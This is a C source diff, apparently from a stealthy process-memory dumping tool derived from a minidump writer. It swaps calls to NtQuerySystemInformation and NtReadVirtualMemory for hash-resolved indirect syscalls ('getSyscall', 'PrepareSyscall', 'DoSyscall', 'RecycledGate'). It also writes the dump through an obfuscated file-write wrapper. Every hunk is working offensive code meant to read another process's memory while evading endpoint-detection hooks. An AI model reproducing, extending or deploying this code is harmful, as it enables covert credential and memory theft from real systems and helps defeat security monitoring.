@@ -64,12 +64,20 @@ static BOOL fetch_process_info(struct dump_context* dc, struct fPtrs *function_p
 
     ULONG       buf_size = 0x1000;
     NTSTATUS    nts;
-    SYSTEM_PROCESS_INFORMATION* pcs_buffer;
+    SYSTEM_PROCESS_INFORMATION* pcs_buffer = NULL;
+
+    DWORD dwSuccess = FAIL;
+    Syscall sysNtQuerySystemInformation = { 0x00 };
+
+    dwSuccess = getSyscall(0xaf0d30ec, &sysNtQuerySystemInformation);
+    if(dwSuccess == FAIL)
+      goto failed;
 
     if (!(pcs_buffer = (SYSTEM_PROCESS_INFORMATION*)function_ptrs->_HeapAlloc(function_ptrs->_GetProcessHeap(), 0, buf_size))) return FALSE;
     for (;;)
     {
-        nts = NtQuerySystemInformation(SystemProcessInformation,
+        PrepareSyscall(sysNtQuerySystemInformation.dwSyscallNr, sysNtQuerySystemInformation.pRecycledGate);
+        nts = DoSyscall(SystemProcessInformation,
             pcs_buffer, buf_size, NULL);
         if (nts != 0xC0000004L) break;
         pcs_buffer = (SYSTEM_PROCESS_INFORMATION*)function_ptrs->_HeapReAlloc(function_ptrs->_GetProcessHeap(), 0, pcs_buffer, buf_size *= 2);
@@ -95,8 +103,12 @@ static BOOL fetch_process_info(struct dump_context* dc, struct fPtrs *function_p
             spi = (SYSTEM_PROCESS_INFORMATION*)((char*)spi + spi->NextEntryOffset);
         }
     }
+
 failed:
-    function_ptrs->_HeapFree(function_ptrs->_GetProcessHeap(), 0, pcs_buffer);
+
+    if(pcs_buffer)
+      function_ptrs->_HeapFree(function_ptrs->_GetProcessHeap(), 0, pcs_buffer);
+
     return FALSE;
 }
 
@@ -247,15 +259,12 @@ static void fetch_memory64_info(struct dump_context* dc, struct fPtrs *function_
     }
 }
 
-static inline BOOL read_process_memory(HANDLE process, UINT64 addr, void* buf, size_t size)
+static inline BOOL read_process_memory(HANDLE process, UINT64 addr, void* buf, size_t size, Syscall *sysNtReadVirtualMemory)
 {
 
-    //_NtReadVirtualMemory NtReadVirtualMemory = (_NtReadVirtualMemory)
-    //    GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtReadVirtualMemory");
-    // Uncommented and using direct syscalls
-
     SIZE_T read = 0;
-    NTSTATUS res = NtReadVirtualMemory(process, (PVOID*)addr, buf, size, &read);
+    PrepareSyscall(sysNtReadVirtualMemory->dwSyscallNr, sysNtReadVirtualMemory->pRecycledGate);
+    NTSTATUS res = DoSyscall(process, (PVOID*)addr, buf, size, &read);
     return !res;
 }
 
@@ -270,6 +279,12 @@ static unsigned         dump_memory64_info(struct dump_context* dc, struct fPtrs
     char                            tmp[1024];
     ULONG64                         pos;
     LARGE_INTEGER                   filepos;
+    DWORD dwSuccess = FAIL;
+
+    Syscall sysNtReadVirtualMemory = { 0x00 };
+    dwSuccess = getSyscall(0x830221a7, &sysNtReadVirtualMemory);
+    if(dwSuccess == FAIL)
+      return FALSE;
 
     sz = sizeof(mdMem64List.NumberOfMemoryRanges) +
         sizeof(mdMem64List.BaseRva) +
@@ -297,7 +312,7 @@ static unsigned         dump_memory64_info(struct dump_context* dc, struct fPtrs
         for (pos = 0; pos < dc->mem64[i].size; pos += sizeof(tmp))
         {
             len = (unsigned)(min(dc->mem64[i].size - pos, sizeof(tmp)));
-            if (read_process_memory(dc->handle, dc->mem64[i].base + pos, tmp, len))
+            if (read_process_memory(dc->handle, dc->mem64[i].base + pos, tmp, len, &sysNtReadVirtualMemory))
                 ObfWriteFile(dc->hFile, tmp, len, &written, NULL, function_pointers);
         }
         filepos.QuadPart += mdMem64.DataSize;
@@ -425,15 +440,20 @@ BOOL validate_addr64(DWORD64 addr)
 BOOL pe_load_nt_header(HANDLE hProc, DWORD64 base, IMAGE_NT_HEADERS* nth)
 {
 
-    //_NtReadVirtualMemory NtReadVirtualMemory = (_NtReadVirtualMemory)
-    //    GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtReadVirtualMemory");
-    // Uncommented and using direct syscalls
+    IMAGE_DOS_HEADER    dos = { 0x00 };
+    DWORD dwSuccess = FAIL;
 
-    IMAGE_DOS_HEADER    dos;
+    Syscall sysNtReadVirtualMemory = { 0x00 };
+    dwSuccess = getSyscall(0x830221a7, &sysNtReadVirtualMemory);
+    if(dwSuccess == FAIL){
+        return FALSE;
+    }
 
-    NTSTATUS res = NtReadVirtualMemory(hProc, (PVOID*)(DWORD_PTR)base, &dos, sizeof(dos), NULL);
+    PrepareSyscall(sysNtReadVirtualMemory.dwSyscallNr, sysNtReadVirtualMemory.pRecycledGate);
+    NTSTATUS res = DoSyscall(hProc, (PVOID*)(DWORD_PTR)base, &dos, sizeof(dos), NULL);
 
-    NTSTATUS res2 = NtReadVirtualMemory(hProc, (PVOID*)(DWORD_PTR)(base + dos.e_lfanew), nth, sizeof(*nth), NULL);
+    PrepareSyscall(sysNtReadVirtualMemory.dwSyscallNr, sysNtReadVirtualMemory.pRecycledGate);
+    NTSTATUS res2 = DoSyscall(hProc, (PVOID*)(DWORD_PTR)(base + dos.e_lfanew), nth, sizeof(*nth), NULL);
 
     return  !res && dos.e_magic == IMAGE_DOS_SIGNATURE && !res2 && nth->Signature == IMAGE_NT_SIGNATURE;
 }
